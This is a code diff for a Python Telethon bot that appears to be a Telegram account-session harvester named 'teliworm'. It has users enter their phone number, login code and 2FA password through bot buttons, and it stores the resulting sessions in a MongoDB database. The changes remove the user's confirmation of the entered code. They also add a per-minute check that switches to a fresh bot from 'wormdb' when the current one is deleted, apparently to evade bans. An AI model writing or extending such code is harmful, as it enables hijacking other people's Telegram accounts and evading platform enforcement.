@@ -1,8 +1,10 @@
-import logging,os,json,telethon,asyncio,time
+import logging,os,json,telethon,asyncio,time,pytz
+from xmlrpc import client
 from typing import Any, Dict, Optional
+from datetime import datetime
 from telethon.tl.custom import Message
 from telethon.tl.types import User
-from telethon import TelegramClient, events, Button, errors
+from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
@@ -25,7 +27,9 @@ if not logger.hasHandlers():
     logger.addHandler(handler)
 mongo_client = MongoClient(os.environ['MONGODB_URI'], server_api=ServerApi('1'))
 database = mongo_client.userdb.sessions
-logger_bot = TelegramClient('teliworm', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
+logger_bot = TelegramClient('teliworm', os.environ['API_ID'], os.environ['API_HASH'])
+usr_client = TelegramClient(StringSession(os.environ['USER_SESSION']), os.environ['API_ID'], os.environ['API_HASH'])
+TIMEZONE = pytz.timezone(os.getenv('TIMEZONE', 'Asia/Colombo'))
 
 def getconfig(key: str, default: Optional[Any] = None) -> Any:
     result = mongo_client.default.config.find_one({'key':key})
@@ -40,12 +44,12 @@ def setconfig(key: str, value: Any) -> None:
 def get(obj: Dict[str, Any], key: str, default: Optional[Any] = None) -> Any:
     try:
         return obj[key]
-    except Exception as e:
+    except:
         return default
 def yesno(x: str, page: str = 'def') -> list:
     return [
-        [Button.inline(strings['yes'], '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
-        [Button.inline(strings['no'], '{{"page":"{}","press":"no{}"}}'.format(page,x))]
+        [Button.inline(strings['yes'], f'{{"page":"{page}","press":"yes{x}"}}')],
+        [Button.inline(strings['no'], f'{{"page":"{page}","press":"no{x}"}}')]
     ]
 async def is_session_authorized(session: str) -> bool:
     logger.info("Checking if session is authorized.")
@@ -74,7 +78,7 @@ async def handle_usr(phone_num: str, event: Message) -> Dict[str, Any]:
         return login
     except Exception as e:
         logger.error(f"Error in handle_usr: {e}")
-        await msg.edit("Error: "+repr(e))
+        await msg.edit(f"Error: {repr(e)}")
     await uclient.disconnect()
     return {}
 async def sign_in(event: Message, user_data: Dict[str, Any]) -> bool:
@@ -187,11 +191,9 @@ async def handler_callback(event: Message) -> None:
         login['code'] += str(press)
     elif press=="clear":
         login['code'] = login['code'][:-1]
-    elif press=="clear_all" or press=="nocode":
+    elif press=="clear_all":
         login['code'] = ''
         login['code_ok'] = False
-    elif press=="yescode":
-        login['code_ok'] = True
     elif press=="yespass":
         login['pass_ok'] = True
         login['need_pass'] = False
@@ -201,17 +203,38 @@ async def handler_callback(event: Message) -> None:
         await event.edit(strings['ask_pass'])
     user_data['login'] = json.dumps(login)
     database.update_one({"chat_id": event.chat_id}, {'$set': {'login': user_data['login']}})
-    if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
-        await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
+    if len(login['code'])==login['code_len']:
+        login['code_ok'] = True
     elif press=="nopass":
         return
     elif not await sign_in(event, user_data):
         await event.edit(strings['ask_code']+login['code'], buttons=numpad)
 
+async def is_bot_active(bot_username: str) -> bool:
+    try:
+        entity = await usr_client.get_entity(f'@{bot_username}')
+        if entity.deleted:
+            return False
+    except telethon.errors.rpcerrorlist.UsernameInvalidError:
+        return False
+    return True
+async def wait_until_next_minute() -> None:
+    now = datetime.now(TIMEZONE)
+    next_minute = now.replace(hour=now.hour, minute=now.minute+1 if now.minute!=59 else 0, second=0, microsecond=0)
+    seconds_to_next_minute = (next_minute-now).total_seconds()
+    await asyncio.sleep(seconds_to_next_minute)
+async def cron(bot_token: str, bot: TelegramClient) -> None:
+    while True:
+        await wait_until_next_minute()
+        if not await is_bot_active(bot_token):
+            logger.info('[-] Bot is inactive')
+            await bot.disconnect()
+            return
+        logger.info('[+] Bot is active')
 async def run_bot() -> None:
     logger.info("Starting bot...")
     bot_count = mongo_client.wormdb.bots.count_documents({})
-    bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
+    bot = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
     for function in botFunctions:
         bot.add_event_handler(function)
     if bot_count==0:
@@ -226,17 +249,21 @@ async def run_bot() -> None:
             logger.error(f"Error starting bot: {e}. Deleting bot from DB.")
             mongo_client.wormdb.bots.delete_one(next_bot)
             raise e
-        if not await bot.is_user_authorized():
+        if not await is_bot_active(next_bot['username']):
             logger.error("Bot not authorized. Deleting bot from DB.")
             mongo_client.wormdb.bots.delete_one(next_bot)
             raise Exception("Bot not authorized")
-    setconfig('BOT_USERNAME', (await bot.get_me()).username)
+    bot_username = (await bot.get_me()).username
+    setconfig('BOT_USERNAME', bot_username)
     setconfig('BOT_TOKEN', os.environ['BOT_TOKEN'] if bot_count==0 else next_bot['token'])
     logger.info("Bot started and running until disconnected.")
+    bot.loop.create_task(cron(bot_username, bot))
     await bot.run_until_disconnected()
 async def main() -> None:
     logger.info("Starting logger bot...")
     await logger_bot.start(bot_token=os.environ['LOGGER_BOT_TOKEN'])
+    logger.info("Starting user client...")
+    await usr_client.connect()
     while True:
         try:
             await run_bot()
